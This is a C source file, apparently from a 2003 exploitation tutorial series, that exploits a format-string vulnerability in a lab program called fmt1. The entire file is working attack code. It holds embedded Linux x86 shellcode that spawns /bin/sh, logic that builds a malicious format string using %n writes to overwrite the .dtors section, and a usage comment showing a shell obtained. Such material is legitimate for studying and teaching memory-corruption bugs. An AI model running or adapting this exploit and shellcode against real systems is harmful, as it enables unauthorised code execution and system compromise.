/*
 * $Id: fmt1-ex3.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * fmt1-ex3.c - fmt1.c exploit (format string exploitation)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is the C version of the previous fmt1-ex.pl exploit (4 writes). Tested 
 * on Linux 2.4.x with gcc-3.2/3.3.1 (0 stackpops) and gcc-2.95.4 (2 stackpops).
 *
 * Malicious buffer structure:
 * [address part] [stackpop sequence] [write string]
 *
 * Usage: ./fmt1-ex3 <numbers of stackpops> (default = 2)
 *
 * $ uname -a
 * Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./fmt1-ex3
 * Using .dtors address    : 0x80495b0
 * Using ret address       : 0xbfffffdc
 * Using format string     : °AAAA±AAAA²AAAA³%.10u%.10u%.172u%n%.35u%n%.256u%n%.192u%n
 * [...]
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN		"./fmt1"	// this is the vulnerable program
#define BUF		1024		// max size of the malicious buffer
#define	DTORS		0x080495ac + 4	// address of first pointer in .dtors
#define STACKPOPSEQ	"%.10u"		// stackpop sequence of choice
#define	STACKPOP	2		// default number of stackpop sequences

/* split an address in 4 bytes */
#define	SPLITB( b1, b2, b3, b4, addr ) {	\
	b1 = (addr & 0x000000ff);		\
	b2 = (addr & 0x0000ff00) >> 8;		\
	b3 = (addr & 0x00ff0000) >> 16;		\
	b4 = (addr & 0xff000000) >> 24;		\
}

char sc[] = /* linux/x86 shellcode (24 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	char 	buf[BUF];
	char 	*envp[2] = {sc, NULL};

	int 	i, stackpop = STACKPOP;
	int 	base, n1, n2, n3, n4;
	int 	ret1, ret2, ret3, ret4;

	char 	*p = buf;
	int 	ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	/* check command line for stackpops */
	if (argc > 1)
		stackpop = atoi(argv[1]);

	/* split the ret address in 4 bytes */
	SPLITB(ret1, ret2, ret3, ret4, ret);

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* address part of the format string */
	*((void **)p) = (void *)(DTORS);
	p += 4;
	memset(p, 'A', 4);	/* dummy */
	p += 4;
	*((void **)p) = (void *)(DTORS + 1);
	p += 4;
	memset(p, 'A', 4);	/* dummy */
	p += 4;
	*((void **)p) = (void *)(DTORS + 2);
	p += 4;
	memset(p, 'A', 4);	/* dummy */
	p += 4;
	*((void **)p) = (void *)(DTORS + 3);
	p += 4;

	/* number of chars written so far */
	base = strlen(buf);

	/* stackpop part of the format string (10 bytes per stackpop) */
	for (i = 0; i < stackpop; i++, p += 5, base += 10)
		strcat(p, STACKPOPSEQ);

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - base) 			% 0x100;
	n2 = (ret2 - base - n1) 		% 0x100;
	n3 = (ret3 - base - n1 - n2)		% 0x100;
	n4 = (ret4 - base - n1 - n2 - n3)	% 0x100;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x100) : (0);
	n2 += (n2 < 10) ? (0x100) : (0);
	n3 += (n3 < 10) ? (0x100) : (0);
	n4 += (n4 < 10) ? (0x100) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%%.%du%%n%%.%du%%n%%.%du%%n%%.%du%%n", n1, n2, n3, n4);

	/* print some output */
	fprintf(stderr, "Using .dtors address\t: %p\n", DTORS);
	fprintf(stderr, "Using ret address\t: %p\n", ret);
	fprintf(stderr, "Using format string\t: %s\n\n", buf);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, envp);
	perror("execle");
}
